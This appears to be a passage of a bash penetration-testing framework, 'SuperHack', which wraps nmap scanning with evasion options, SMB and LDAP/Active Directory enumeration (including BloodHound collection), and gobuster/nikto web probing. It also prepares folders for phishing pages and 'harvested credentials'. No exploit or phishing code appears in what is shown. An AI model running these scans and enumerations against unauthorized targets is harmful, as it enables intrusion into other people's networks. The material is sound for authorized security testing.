#!/bin/bash

# SuperHack - Penetration Testing Automation Framework
# For authorized security testing only
# Compatible with Raspberry Pi (ARM architecture)
# Enhanced with Phishing Tools and Extended Capabilities

VERSION="2.5"                                         # Current framework version
CONFIG_DIR="/home/evanmarr/.superhack"                # Base configuration directory
LOG_DIR="$CONFIG_DIR/logs"                            # Directory for log files
WORDLISTS_DIR="$CONFIG_DIR/wordlists"                 # Password lists and dictionaries
RESULTS_DIR="$CONFIG_DIR/results"                     # Scan results storage
PHISHING_DIR="$CONFIG_DIR/phishing"                   # Phishing campaign files
CREDS_DIR="$CONFIG_DIR/credentials"                   # Harvested credentials storage

# Colors for output - ANSI escape codes for terminal formatting
RED='\033[0;31m'                                      # Red: errors, warnings, critical alerts
GREEN='\033[0;32m'                                    # Green: success, completion messages
YELLOW='\033[1;33m'                                   # Yellow: caution, in-progress, notices
BLUE='\033[0;34m'                                     # Blue: informational headers
CYAN='\033[0;36m'                                     # Cyan: banners, titles, highlights
MAGENTA='\033[0;35m'                                  # Magenta: special highlights
GREY='\033[0;90m'                                     # Grey: secondary info, disabled items
NC='\033[0m'                                          # No Color: reset to default

# =============================================================================
# PACKAGE DEFINITIONS
# =============================================================================

# Core system packages required for penetration testing
CORE_PACKAGES=(
    "nmap" "metasploit-framework" "netcat-traditional" "hydra" "gobuster"
    "dirb" "enum4linux-ng" "john" "hashcat" "sqlmap" "nikto" "masscan"
    "dnsutils" "whois" "curl" "wget" "git" "iw" "tcpdump" "proxychains4"
    "wireless-tools" "aircrack-ng" "python3" "python3-pip" "arp-scan"
    "netdiscover" "macchanger" "crackmapexec" "responder" "bloodhound.py"
    "wireshark" "tshark" "bettercap" "mitmproxy" "httrack" "sendemail"
    "openssl" "sshpass" "tmux" "screen" "vim" "nano"
)

# Python packages for extended functionality
PYTHON_PACKAGES=(
    "impacket" "requests" "beautifulsoup4" "scapy" "pwntools" "python-nmap"
    "smbprotocol" "ldap3" "pyftpdlib" "pysmb" "paramiko" "cryptography"
    "pyOpenSSL" "flask" "django" "mechanize" "selenium" "pyautogui"
)

# Arrays to track missing packages during startup checks
MISSING_PACKAGES=()
MISSING_PYTHON=()

# =============================================================================
# INITIALIZATION & VALIDATION
# =============================================================================

# Strict sudo check - exit immediately if not root
# Many penetration testing tools require raw socket access and root privileges
if [[ $EUID -ne 0 ]]; then                            # Check Effective User ID is NOT 0
    echo "Must run with sudo. Quitting!"             # Error message for non-root users
    exit 1                                           # Exit with error code 1
fi

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

# Create directory with error checking and fallback to sudo
# Arguments: $1 = directory path to create
create_dir() {
    local dir="$1"                                   # Local variable for directory path
    
    # Check if directory already exists
    if [[ ! -d "$dir" ]]; then
        # Attempt to create directory, suppress errors
        mkdir -p "$dir" 2>/dev/null || {
            # If mkdir fails, try with sudo
            echo -e "${RED}[!] Failed to create directory: $dir${NC}"
            sudo mkdir -p "$dir" 2>/dev/null || {
                # Critical failure - cannot create directory
                echo -e "${RED}[!] Critical: Cannot create directory $dir${NC}"
                return 1                             # Return error code
            }
        }
        chmod 755 "$dir" 2>/dev/null                   # Set permissions (rwxr-xr-x)
        echo -e "${GREEN}[+] Created directory: $dir${NC}"
    fi
    return 0                                         # Success
}

# Initialize all required directories for the framework
init_dirs() {
    echo -e "${BLUE}[*] Initializing directories...${NC}"
    
    # Create base directories with error checking
    create_dir "$CONFIG_DIR" || exit 1
    create_dir "$LOG_DIR" || exit 1
    create_dir "$WORDLISTS_DIR" || exit 1
    create_dir "$RESULTS_DIR" || exit 1
    create_dir "$RESULTS_DIR/nmap" || exit 1
    create_dir "$RESULTS_DIR/enumeration" || exit 1
    create_dir "$RESULTS_DIR/exploitation" || exit 1
    create_dir "$RESULTS_DIR/wifi" || exit 1
    create_dir "$RESULTS_DIR/bruteforce" || exit 1
    create_dir "$RESULTS_DIR/cracking" || exit 1
    create_dir "$PHISHING_DIR" || exit 1              # Phishing campaign storage
    create_dir "$PHISHING_DIR/templates" || exit 1    # Phishing page templates
    create_dir "$PHISHING_DIR/captured" || exit 1     # Captured credentials/data
    create_dir "$CREDS_DIR" || exit 1                 # Credential database
    
    # Set ownership to original user (not root) for file access
    chown -R "$SUDO_USER:$SUDO_USER" "$CONFIG_DIR" 2>/dev/null || \
    chown -R "$(whoami):$(whoami)" "$CONFIG_DIR" 2>/dev/null || true
    
    echo -e "${GREEN}[+] Directories initialized${NC}"
}

# Prompt user to save results to file
# Arguments: $1 = data to save, $2 = default filename, $3 = subdirectory
save_results_prompt() {
    local data="$1"                                  # Data content to save
    local default_filename="$2"                      # Suggested filename
    local subdir="$3"                                # Subdirectory under RESULTS_DIR
    
    echo ""
    echo -n "Save results to file? (y/n): "
    read save_choice
    
    # Process if user wants to save
    if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
        echo -n "Enter filename (default: $default_filename): "
        read custom_filename
        local filename="${custom_filename:-$default_filename}"  # Use default if empty
        
        # Ensure .txt extension for text files
        [[ "$filename" != *.txt ]] && filename="${filename}.txt"
        
        local output_path="$RESULTS_DIR/$subdir/$filename"
        
        # Write data to file
        if echo "$data" > "$output_path"; then
            echo -e "${GREEN}[+] Results saved to: $output_path${NC}"
        else
            echo -e "${RED}[!] Failed to save results${NC}"
        fi
    fi
}

# Execute command and optionally save output using tee
# Arguments: $1 = command, $2 = default filename, $3 = subdir, $4 = description
save_command_output() {
    local cmd="$1"                                   # Command to execute
    local default_filename="$2"                      # Default output filename
    local subdir="$3"                                # Results subdirectory
    local description="$4"                           # Description for prompt
    
    echo -n "Save $description to file? (y/n): "
    read save_choice
    
    if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
        echo -n "Enter filename (default: $default_filename): "
        read custom_filename
        local filename="${custom_filename:-$default_filename}"
        
        [[ "$filename" != *.txt ]] && filename="${filename}.txt"
        
        local output_path="$RESULTS_DIR/$subdir/$filename"
        
        echo -e "${YELLOW}[*] Running and saving to $output_path...${NC}"
        eval "$cmd" | tee "$output_path"             # Execute and save simultaneously
        echo -e "${GREEN}[+] Results saved to: $output_path${NC}"
    else
        eval "$cmd"                                  # Just execute without saving
    fi
}

# Download file with retry logic for unreliable connections
# Arguments: $1 = URL, $2 = output path, $3 = max retries (optional)
download_file() {
    local url="$1"                                   # Source URL
    local output="$2"                                # Destination path
    local max_retries="${3:-3}"                      # Default 3 retries
    local retry=0
    
    # Create parent directory if needed
    local outdir=$(dirname "$output")
    create_dir "$outdir" || return 1
    
    # Retry loop for resilience
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Downloading (attempt $((retry+1))/$max_retries): $(basename "$output")${NC}"
        
        # wget with timeout and resume capability
        if wget --timeout=30 --tries=2 --continue \
                --progress=bar:force \
                -O "$output.tmp" "$url" 2>&1 | tail -5; then
            
            # Verify download succeeded (file exists and not empty)
            if [[ -f "$output.tmp" && -s "$output.tmp" ]]; then
                mv "$output.tmp" "$output"           # Move from temp to final
                chmod 644 "$output"                  # Set read permissions
                echo -e "${GREEN}[+] Successfully downloaded: $(basename "$output")${NC}"
                return 0                             # Success
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2     # Wait before retry
    done
    
    # All retries failed
    rm -f "$output.tmp"
    echo -e "${RED}[!] Failed to download after $max_retries attempts${NC}"
    return 1                                         # Failure
}

# Clone or update git repository
# Arguments: $1 = repository URL, $2 = destination path
clone_repo() {
    local url="$1"                                   # Git repository URL
    local dest="$2"                                  # Local destination
    
    local destdir=$(dirname "$dest")
    create_dir "$destdir" || return 1
    
    # Update existing repository
    if [[ -d "$dest" ]]; then
        echo -e "${YELLOW}[!] Directory exists, updating: $(basename "$dest")${NC}"
        cd "$dest" && git pull --depth 1 2>/dev/null || {
            echo -e "${YELLOW}[!] Update failed, using existing files${NC}"
            return 0
        }
        echo -e "${GREEN}[+] Updated repository${NC}"
        return 0
    fi
    
    # Clone new repository
    echo -e "${YELLOW}[*] Cloning repository...${NC}"
    if git clone --depth 1 "$url" "$dest" 2>&1 | tail -10; then
        if [[ -d "$dest" ]]; then
            echo -e "${GREEN}[+] Successfully cloned: $(basename "$dest")${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}[!] Failed to clone repository${NC}"
    return 1
}

# =============================================================================
# DISPLAY FUNCTIONS
# =============================================================================

# Display ASCII art banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
EOF
    echo -e "${NC}${CYAN}     The ultimate hacking multitool${NC}"
    echo -e ""
    echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
    echo -e "${RED}                    [ Authorized Use Only ]${NC}"
    echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
    echo ""
}

# =============================================================================
# PACKAGE MANAGEMENT
# =============================================================================

# Check if system package is installed
is_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii  $1 " || command -v "$1" &>/dev/null
}

# Check if Python package is installed
is_python_installed() {
    local pkg="$1"
    python3 -c "import $pkg" 2>/dev/null
}

# Scan for missing packages and populate arrays
check_missing_packages() {
    MISSING_PACKAGES=()
    echo -e "${BLUE}[*] Checking system packages...${NC}"
    
    for pkg in "${CORE_PACKAGES[@]}"; do
        if ! dpkg -l | grep -q "^ii  $pkg "; then
            MISSING_PACKAGES+=("$pkg")
            echo -e "${GREY}    - Missing: $pkg${NC}"
        fi
    done
    
    MISSING_PYTHON=()
    echo -e "${BLUE}[*] Checking Python packages...${NC}"
    
    for pkg in "${PYTHON_PACKAGES[@]}"; do
        local import_name="${pkg//-/_}"               # Convert dashes to underscores
        [[ "$pkg" == "beautifulsoup4" ]] && import_name="bs4"
        [[ "$pkg" == "python-nmap" ]] && import_name="nmap"
        if ! python3 -c "import $import_name" 2>/dev/null; then
            MISSING_PYTHON+=("$pkg")
            echo -e "${GREY}    - Missing: $pkg${NC}"
        fi
    done
}

# Smart package manager - runs at startup
smart_package_manager() {
    check_missing_packages
    
    local total_missing=${#MISSING_PACKAGES[@]}
    local total_missing_py=${#MISSING_PYTHON[@]}
    local total=$((total_missing + total_missing_py))
    
    # All packages installed
    if [[ $total -eq 0 ]]; then
        echo -e "${GREEN}[+] All dependencies are installed and up to date!${NC}"
        sleep 1
        return 0
    fi
    
    # Display missing packages
    echo -e "${YELLOW}[!] Found $total missing package(s):${NC}"
    echo ""
    
    if [[ $total_missing -gt 0 ]]; then
        echo -e "${CYAN}System packages missing ($total_missing):${NC}"
        printf '  - %s\n' "${MISSING_PACKAGES[@]}"
        echo ""
    fi
    
    if [[ $total_missing_py -gt 0 ]]; then
        echo -e "${CYAN}Python packages missing ($total_missing_py):${NC}"
        printf '  - %s\n' "${MISSING_PYTHON[@]}"
        echo ""
    fi
    
    # User choice for installation
    echo "What would you like to do?"
    echo "1) Install ALL missing packages"
    echo "2) Select which packages to install"
    echo "3) Skip for now (not recommended)"
    echo -n "Choice: "
    read choice
    
    case $choice in
        1) install_all_packages ;;
        2) selective_package_install ;;
        3) 
            echo -e "${YELLOW}[!] Some features may not work without dependencies${NC}"
            sleep 2
            ;;
        *) 
            echo -e "${RED}Invalid choice, skipping...${NC}"
            sleep 1
            ;;
    esac
}

# Install package with retry logic
install_package() {
    local pkg="$1"
    local max_retries=2
    local retry=0
    
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Installing $pkg (attempt $((retry+1))/$max_retries)...${NC}"
        
        if apt-get install -y "$pkg" 2>&1 | tail -20; then
            if dpkg -l | grep -q "^ii  $pkg "; then
                echo -e "${GREEN}[+] $pkg installed successfully${NC}"
                return 0
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2
    done
    
    echo -e "${RED}[!] Failed to install $pkg after $max_retries attempts${NC}"
    return 1
}

# Install Python package with retry
install_python_package() {
    local pkg="$1"
    local max_retries=2
    local retry=0
    
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Installing Python package $pkg (attempt $((retry+1))/$max_retries)...${NC}"
        
        if pip3 install "$pkg" 2>&1 | tail -20; then
            echo -e "${GREEN}[+] $pkg installed successfully${NC}"
            return 0
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2
    done
    
    echo -e "${RED}[!] Failed to install $pkg after $max_retries attempts${NC}"
    return 1
}

# Install all missing packages
install_all_packages() {
    echo -e "${BLUE}[*] Installing all missing packages...${NC}"
    
    echo -e "${YELLOW}[*] Updating package lists...${NC}"
    apt-get update -qq || {
        echo -e "${RED}[!] Failed to update package lists${NC}"
        return 1
    }
    
    # Install system packages
    if [[ ${#MISSING_PACKAGES[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Installing ${#MISSING_PACKAGES[@]} system packages...${NC}"
        for pkg in "${MISSING_PACKAGES[@]}"; do
            install_package "$pkg" || true
        done
    fi
    
    # Install Python packages
    if [[ ${#MISSING_PYTHON[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Installing ${#MISSING_PYTHON[@]} Python packages...${NC}"
        pip3 install --upgrade pip 2>/dev/null || true
        
        for pkg in "${MISSING_PYTHON[@]}"; do
            install_python_package "$pkg" || true
        done
    fi
    
    download_wordlists
    
    # Initialize Metasploit database
    if command -v msfdb &> /dev/null; then
        echo -e "${BLUE}[*] Initializing Metasploit database...${NC}"
        msfdb init 2>/dev/null || msfdb reinit 2>/dev/null || true
    fi
    
    echo -e "${GREEN}[+] Package installation complete!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Selective package installation
selective_package_install() {
    local all_packages=("${MISSING_PACKAGES[@]}" "${MISSING_PYTHON[@]}")
    local i=1
    local selections
    
    echo -e "${CYAN}Select packages to install (enter numbers separated by spaces):${NC}"
    echo ""
    
    # Display numbered list
    for pkg in "${MISSING_PACKAGES[@]}"; do
        echo "  $i) [SYSTEM] $pkg"
        ((i++))
    done
    
    for pkg in "${MISSING_PYTHON[@]}"; do
        echo "  $i) [PYTHON] $pkg"
        ((i++))
    done
    
    echo ""
    echo -n "Enter package numbers (e.g., 1 3 5): "
    read selections
    
    apt-get update -qq || true
    
    # Process selections
    for num in $selections; do
        if [[ $num -le ${#MISSING_PACKAGES[@]} ]]; then
            local pkg="${MISSING_PACKAGES[$((num-1))]}"
            install_package "$pkg"
        else
            local py_idx=$((num - ${#MISSING_PACKAGES[@]} - 1))
            local pkg="${MISSING_PYTHON[$py_idx]}"
            install_python_package "$pkg"
        fi
    done
    
    echo ""
    echo -n "Download wordlists too? (y/n): "
    read dl_wordlists
    [[ "$dl_wordlists" == "y" ]] && download_wordlists
    
    echo -e "${GREEN}[+] Selected packages installed!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Download essential wordlists
download_wordlists() {
    echo -e "${BLUE}[*] Checking wordlists...${NC}"
    
    # Download rockyou.txt password list
    if [[ ! -f "$WORDLISTS_DIR/rockyou.txt" ]]; then
        echo -e "${YELLOW}[!] Downloading rockyou.txt...${NC}"
        
        local urls=(
            "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        )
        
        local downloaded=false
        for url in "${urls[@]}"; do
            if [[ "$url" == *.tar.gz ]]; then
                if download_file "$url" "$WORDLISTS_DIR/rockyou.txt.tar.gz"; then
                    echo -e "${YELLOW}[*] Extracting archive...${NC}"
                    tar -xzf "$WORDLISTS_DIR/rockyou.txt.tar.gz" -C "$WORDLISTS_DIR" 2>/dev/null && \
                    rm -f "$WORDLISTS_DIR/rockyou.txt.tar.gz"
                    [[ -f "$WORDLISTS_DIR/rockyou.txt" ]] && downloaded=true
                fi
            else
                if download_file "$url" "$WORDLISTS_DIR/rockyou.txt"; then
                    downloaded=true
                    break
                fi
            fi
        done
        
        # Verify download or create placeholder
        if $downloaded && [[ -f "$WORDLISTS_DIR/rockyou.txt" && -s "$WORDLISTS_DIR/rockyou.txt" ]]; then
            local size=$(du -h "$WORDLISTS_DIR/rockyou.txt" | cut -f1)
            echo -e "${GREEN}[+] rockyou.txt downloaded ($size)${NC}"
        else
            echo -e "${RED}[!] Failed to download rockyou.txt${NC}"
            echo "password" > "$WORDLISTS_DIR/rockyou.txt"
            echo -e "${YELLOW}[!] Created minimal placeholder wordlist${NC}"
        fi
    else
        echo -e "${GREEN}[+] rockyou.txt already exists${NC}"
    fi
    
    # Download SecLists collection
    if [[ ! -d "$WORDLISTS_DIR/seclists" ]]; then
        echo -e "${YELLOW}[!] Downloading SecLists...${NC}"
        if clone_repo "https://github.com/danielmiessler/SecLists.git" "$WORDLISTS_DIR/seclists"; then
            if [[ -d "$WORDLISTS_DIR/seclists/Discovery" ]]; then
                echo -e "${GREEN}[+] SecLists downloaded successfully${NC}"
            else
                echo -e "${RED}[!] SecLists download incomplete${NC}"
            fi
        fi
    else
        echo -e "${GREEN}[+] SecLists already exists${NC}"
    fi
    
    chmod -R 755 "$WORDLISTS_DIR" 2>/dev/null || true
}

# Legacy compatibility wrapper
check_install() {
    local pkg=$1
    local cmd=${2:-$pkg}
    
    if ! command -v "$cmd" &> /dev/null; then
        echo -e "${YELLOW}[!] $pkg not found. Installing...${NC}"
        install_package "$pkg" || {
            echo -e "${RED}[!] Failed to install $pkg${NC}"
            return 1
        }
    fi
}

# =============================================================================
# NETWORK SCANNING MODULES
# =============================================================================

# Advanced customizable Nmap scanner with multiple options
advanced_nmap_scan() {
    check_install nmap
    echo -e "${BLUE}[*] Advanced Nmap Scanner${NC}"
    echo ""
    
    echo -n "Enter target(s) (IP, hostname, range, or file with -iL): "
    read target
    
    echo ""
    echo -e "${CYAN}=== SCAN TYPE ===${NC}"
    echo "1) SYN Scan (-sS) - Stealth, requires root"
    echo "2) Connect Scan (-sT) - TCP connect"
    echo "3) UDP Scan (-sU) - UDP ports"
    echo "4) ACK Scan (-sA) - Firewall rule mapping"
    echo "5) Window Scan (-sW) - Similar to ACK"
    echo "6) FIN/NULL/Xmas Scan (-sF/sN/sX) - Stealthy"
    echo "7) Comprehensive (Multiple types)"
    echo -n "Select scan type: "
    read scan_type
    
    echo ""
    echo -e "${CYAN}=== PORT SELECTION ===${NC}"
    echo "1) Top 100 common ports (--top-ports 100)"
    echo "2) Top 1000 common ports (--top-ports 1000)"
    echo "3) All 65535 ports (-p-)"
    echo "4) Specific ports (e.g., 80,443,8080)"
    echo "5) Default Nmap ports"
    echo -n "Select port option: "
    read port_option
    
    # Configure port scanning options
    case $port_option in
        1) port_flag="--top-ports 100" ;;
        2) port_flag="--top-ports 1000" ;;
        3) port_flag="-p-" ;;
        4) 
            echo -n "Enter ports (comma-separated or range like 1-1000): "
            read custom_ports
            port_flag="-p $custom_ports"
            ;;
        5) port_flag="" ;;
    esac
    
    echo ""
    echo -e "${CYAN}=== ADDITIONAL OPTIONS ===${NC}"
    
    echo -n "Enable service/version detection (-sV)? (y/n): "
    read sv_detect
    [[ "$sv_detect" == "y" ]] && sv_flag="-sV" || sv_flag=""
    
    echo -n "Enable OS detection (-O)? (y/n): "
    read os_detect
    [[ "$os_detect" == "y" ]] && os_flag="-O" || os_flag=""
    
    echo -n "Enable aggressive scan (includes -sV -O --traceroute)? (y/n): "
    read aggressive
    if [[ "$aggressive" == "y" ]]; then
        agg_flag="-A"
        sv_flag=""
        os_flag=""
    else
        agg_flag=""
    fi
    
    echo -n "Enable script scan? (y/n): "
    read script_scan
    if [[ "$script_scan" == "y" ]]; then
        echo "  Script categories:"
        echo "  1) Default scripts (-sC)"
        echo "  2) Safe scripts (--script safe)"
        echo "  3) Vulnerability scripts (--script vuln)"
        echo "  4) All scripts (--script all)"
        echo "  5) Custom script (--script <name>)"
        echo -n "  Select: "
        read script_choice
        case $script_choice in
            1) script_flag="-sC" ;;
            2) script_flag="--script safe" ;;
            3) script_flag="--script vuln" ;;
            4) script_flag="--script all" ;;
            5) 
                echo -n "Enter script name: "
                read custom_script
                script_flag="--script $custom_script"
                ;;
        esac
    else
        script_flag=""
    fi
    
    echo ""
    echo -e "${CYAN}=== TIMING & PERFORMANCE ===${NC}"
    echo "1) Paranoid (T0) - IDS evasion"
    echo "2) Sneaky (T1)"
    echo "3) Polite (T2)"
    echo "4) Normal (T3)"
    echo "5) Aggressive (T4)"
    echo "6) Insane (T5)"
    echo -n "Select timing template: "
    read timing
    case $timing in
        1) time_flag="-T0" ;;
        2) time_flag="-T1" ;;
        3) time_flag="-T2" ;;
        4) time_flag="-T3" ;;
        5) time_flag="-T4" ;;
        6) time_flag="-T5" ;;
        *) time_flag="-T4" ;;
    esac
    
    echo -n "Enable fragmentation (-f)? (y/n): "
    read fragment
    [[ "$fragment" == "y" ]] && frag_flag="-f" || frag_flag=""
    
    echo -n "Enable verbose output (-v)? (y/n): "
    read verbose
    [[ "$verbose" == "y" ]] && verb_flag="-v" || verb_flag=""
    
    echo ""
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    if [[ "$auto_save" == "y" ]]; then
        output_base="$RESULTS_DIR/nmap/nmap_scan_$timestamp"
        output_flag="-oA $output_base"
        echo -e "${GREEN}[+] Will save results to: $output_base.{nmap,xml,gnmap}${NC}"
    else
        output_flag=""
    fi
    
    # Set scan type flag
    case $scan_type in
        1) scan_flag="-sS" ;;
        2) scan_flag="-sT" ;;
        3) scan_flag="-sU" ;;
        4) scan_flag="-sA" ;;
        5) scan_flag="-sW" ;;
        6) 
            echo "Select specific stealth scan:"
            echo "1) FIN (-sF)"
            echo "2) NULL (-sN)"
            echo "3) Xmas (-sX)"
            read stealth_choice
            case $stealth_choice in
                1) scan_flag="-sF" ;;
                2) scan_flag="-sN" ;;
                3) scan_flag="-sX" ;;
            esac
            ;;
        7)
            echo -e "${YELLOW}[*] Running comprehensive scan...${NC}"
            ;;
    esac
    
    # Build and execute nmap command
    local nmap_cmd="nmap $scan_flag $port_flag $sv_flag $os_flag $agg_flag $script_flag $time_flag $frag_flag $verb_flag $output_flag $target"
    
    echo ""
    echo -e "${CYAN}=== SCAN CONFIGURATION ===${NC}"
    echo -e "${GREEN}Command: $nmap_cmd${NC}"
    echo ""
    echo -n "Press Enter to start scan or Ctrl+C to cancel..."
    read
    
    echo -e "${YELLOW}[*] Starting scan...${NC}"
    echo -e "${CYAN}========================================${NC}"
    
    if [[ -n "$output_flag" ]]; then
        eval "$nmap_cmd"
        echo -e "${CYAN}========================================${NC}"
        echo -e "${GREEN}[+] Results saved to: $output_base.{nmap,xml,gnmap}${NC}"
    else
        local results=$(eval "$nmap_cmd" 2>&1)
        echo "$results"
        echo -e "${CYAN}========================================${NC}"
        
        # Ask to save after scan
        save_results_prompt "$results" "nmap_scan_$timestamp.txt" "nmap"
    fi
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

# Network discovery via ping sweeps
network_discovery() {
    check_install nmap
    echo -e "${BLUE}[*] Network Discovery Module${NC}"
    echo -n "Enter target subnet (e.g., 192.168.1.0/24): "
    read subnet
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -e "${YELLOW}[*] Scanning $subnet for live hosts...${NC}"
    
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    if [[ "$auto_save" == "y" ]]; then
        local output_file="$RESULTS_DIR/nmap/discovery_$timestamp.txt"
        nmap -sn "$subnet" -oN "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
        cat "$output_file"
    else
        local results=$(nmap -sn "$subnet" 2>&1)
        echo "$results"
        
        save_results_prompt "$results" "discovery_$timestamp.txt" "nmap"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Legacy port scanner (redirects to advanced)
port_scanner() {
    echo -e "${YELLOW}[*] Basic port scanner deprecated. Use Advanced Nmap Scanner.${NC}"
    sleep 1
    advanced_nmap_scan
}

# =============================================================================
# ENUMERATION MODULES
# =============================================================================

# SMB enumeration for Windows file shares
smb_enum() {
    check_install enum4linux-ng enum4linux-ng
    echo -e "${BLUE}[*] SMB Enumeration Module${NC}"
    echo -n "Enter target IP: "
    read target
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    if [[ "$auto_save" == "y" ]]; then
        local output_file="$RESULTS_DIR/enumeration/smb_${target}_$timestamp.txt"
        echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
        enum4linux-ng -A "$target" | tee "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    else
        echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
        local results=$(enum4linux-ng -A "$target" 2>&1)
        echo "$results"
        
        save_results_prompt "$results" "smb_${target}_$timestamp.txt" "enumeration"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# LDAP/Active Directory enumeration
ldap_enum() {
    echo -e "${BLUE}[*] LDAP/Active Directory Enumeration${NC}"
    echo -n "Enter target DC IP: "
    read dc_ip
    echo -n "Enter domain name (e.g., corp.local): "
    read domain
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo ""
    echo -e "${CYAN}=== LDAP ENUMERATION OPTIONS ===${NC}"
    echo "1) Anonymous LDAP bind"
    echo "2) Authenticated LDAP query"
    echo "3) LDAP user enumeration"
    echo "4) BloodHound data collection"
    echo -n "Select option: "
    read ldap_choice
    
    case $ldap_choice in
        1)
            echo -e "${YELLOW}[*] Attempting anonymous LDAP bind...${NC}"
            local results=$(ldapsearch -x -H "ldap://$dc_ip" -b "dc=${domain//./,dc=}" 2>&1)
            echo "$results"
            save_results_prompt "$results" "ldap_anon_$timestamp.txt" "enumeration"
            ;;
        2)
            echo -n "Enter username: "
            read ldap_user
            echo -n "Enter password: "
            read -s ldap_pass
            echo ""
            local results=$(ldapsearch -x -H "ldap://$dc_ip" -D "$ldap_user@$domain" -w "$ldap_pass" -b "dc=${domain//./,dc=}" 2>&1)
            echo "$results"
            save_results_prompt "$results" "ldap_auth_$timestamp.txt" "enumeration"
            ;;
        3)
            echo -e "${YELLOW}[*] Running user enumeration...${NC}"
            if [[ -f "$WORDLISTS_DIR/seclists/Usernames/Names/names.txt" ]]; then
                local results=$(for user in $(head -100 "$WORDLISTS_DIR/seclists/Usernames/Names/names.txt"); do
                    ldapsearch -x -H "ldap://$dc_ip" -b "dc=${domain//./,dc=}" "(cn=$user)" 2>&1 | grep -q "numEntries" && echo "[+] User found: $user"
                done)
                echo "$results"
                save_results_prompt "$results" "ldap_users_$timestamp.txt" "enumeration"
            else
                echo -e "${RED}[!] Username wordlist not found${NC}"
            fi
            ;;
        4)
            check_install bloodhound.py
            echo -e "${YELLOW}[*] Collecting BloodHound data...${NC}"
            local blood_dir="$RESULTS_DIR/enumeration/bloodhound_$timestamp"
            create_dir "$blood_dir"
            echo -n "Enter username (optional, press Enter for anonymous): "
            read bh_user
            if [[ -n "$bh_user" ]]; then
                echo -n "Enter password: "
                read -s bh_pass
                echo ""
                bloodhound-python -d "$domain" -u "$bh_user" -p "$bh_pass" -dc "$dc_ip" -c All -o "$blood_dir"
            else
                bloodhound-python -d "$domain" -dc "$dc_ip" -c All -o "$blood_dir" --no-pass
            fi
            echo -e "${GREEN}[+] BloodHound data saved to: $blood_dir${NC}"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# Web enumeration with directory brute forcing
web_enum() {
    check_install gobuster
    check_install nikto
    echo -e "${BLUE}[*] Web Enumeration Module${NC}"
    echo -n "Enter target URL (e.g., http://target.com): "
    read target
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$RESULTS_DIR/enumeration/web_$timestamp"
    
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    if [[ "$auto_save" == "y" ]]; then
        create_dir "$output_dir"
        
        echo -e "${YELLOW}[*] Running directory brute force...${NC}"
        if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
            gobuster dir -u "$target" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
                -o "$output_dir/directories.txt" -t 50
        else
            gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" \
                -o "$output_dir/directories.txt" -t 50
        fi
        
        echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
        nikto -h "$target" -o "$output_dir/nikto.txt"
        
        echo -e "${GREEN}[+] Results saved to: $output_dir${NC}"
    else
        echo -e "${YELLOW}[*] Running directory brute force...${NC}"
        local gobuster_results=$(gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" -t 50 2>&1)
        echo "$gobuster_results"
        
        echo ""
        echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
        local nikto_results=$(nikto -h "$target" 2>&1)
        echo "$nikto_results"
        
        local combined_results="=== GOBUSTER RESULTS ===\n$gobuster_results\n\n=== NIKTO RESULTS ===\n$nikto_results"
        save_results_prompt "$combined_results" "web_enum_$timestamp.txt" "enumeration"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

